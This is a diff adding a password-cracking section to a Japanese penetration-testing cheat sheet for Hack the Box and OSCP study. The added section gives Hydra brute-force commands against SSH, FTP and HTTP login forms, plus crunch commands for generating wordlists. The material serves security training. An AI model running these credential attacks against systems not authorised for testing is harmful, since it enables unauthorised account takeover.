@@ -29,6 +29,7 @@ Hack the Box の攻略や、OSCP 取得を目指すためのチートシート�
   - [metasploit local_exploit_suggester](#metasploit(local_exploit_suggester))
 - [セキュリティ診断ツール](#セキュリティ診断ツール)
   - [Burp](#burp)
+- [パスワードクラック](#Hydra)
 - [便利コマンド](#便利コマンド)
     
   
@@ -331,6 +332,60 @@ curl http://127.0.0.1:1212/cgi-bin/user.sh
 
 これで、intercept　される
 
+```
+
+# パスワードクラック
+
+### Hydra
+
+[公式リンク](https://tools.kali.org/password-attacks/hydra)
+SSHやFTPなどのサービスや、webアプリのログインフォーム(Basic認証)に対して攻撃が出来る。(ssh, ftp, http, imap, pop3)
+攻撃時は、あらかじめ攻撃する値を記載したファイルを利用することが出来る
+
+[参考記事](https://ozuma.hatenablog.jp/entry/20130601/1370094859)
+
+```
+hydra -l <username or user.txt> -p <password or password.txt> 192.168.56.1 -t 4 ssh
+
+※-t は並列処理のタスク数宇
+```
+
+ex (ftp):
+```
+・username も password もわからない時。
+hydra -L user.lst -P pass.lst -t 16 ターゲットIP ftp
+hydra -L user.lst -P pass.lst -t 8 ターゲットIP ftp
+
+・username わかってる時。
+hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=failed"
+hydra -l userlist.txt -P passwordlist.txt 192.168.0.107 ft
+```
+
+ex (ssh)
+```
+hydra -L user.lst -P pass.lst -t 4 ターゲットIP ssh
+
+```
+
+- crunch コマンドで、wordlist を作れる
+
+```
+crunch <最小の文字数> <最大の文字数> <オプション><文字候補>
+
+ex: 
+
+最小1文字、最大で6文字のパスワードで"a", "k", "n", "s"の4文字から抽出したパスワードを"wordlist"と言う名前のファイルに格納します。
+crunch 1 6 akns -o wordlists
+
+1-3文字で、0-9 のパスワード
+crunch 1 3 0123456789
+
+/home/kali に作成
+crunch 3 3 12345 >> /home/kali/pass.txt
+
+/usr/share/wordlists に作成 (巨大なファイルになるため、実行要注意)
+crunch 3 5 0123456789abcdefghijklmnopqrstuvwxyz >> /usr/share/wordlists/rockyou.txt
 ```
 
 
